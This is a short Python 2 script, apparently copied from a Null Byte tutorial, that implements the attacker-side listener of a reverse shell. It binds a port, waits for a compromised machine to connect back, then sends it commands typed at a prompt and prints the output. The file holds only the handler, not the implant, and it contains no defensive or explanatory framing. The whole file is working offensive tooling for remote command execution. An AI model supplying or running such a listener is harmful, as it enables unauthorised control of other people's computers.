
#https://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/


import socket, os, sys

def socketCreate():
    try:
        global host
        global port
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host = ''
        port = raw_input('type the port for listening: ')
        if port == '':
            socketCreate()
        port = int(port)
    except socket.error as msg:
        print ('oopsies')

def socketBind():
    try:
        print ('Binding as %s' %(port))
        s.bind((host,port))
        s.listen(1)
    except socket.error as msg:
        print ('r u dumb')
        #try to bind again
        socketBind()

def socketAccept():
    global conn
    global addr 
    global hostname
    try:
        conn , addr = s.accept()
        print ('[!] Session opened at %s:%s' %(addr[0],addr[1]))
        print ('\n')
        hostname = conn.recv(1024)
        menu()
    except socket.error as msg:
        print (' this is unacceptable')

def menu():
    print('Reverse shell initiated')
    while 1:
        cmd = raw_input(str(addr[0])+'@' + str(hostname) + '> ')
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        command = conn.send(cmd)
        result = conn.recv(16834)
        if result <> hostname:
            print (result)


def main():
    socketCreate()
    socketBind()
    socketAccept()

main()
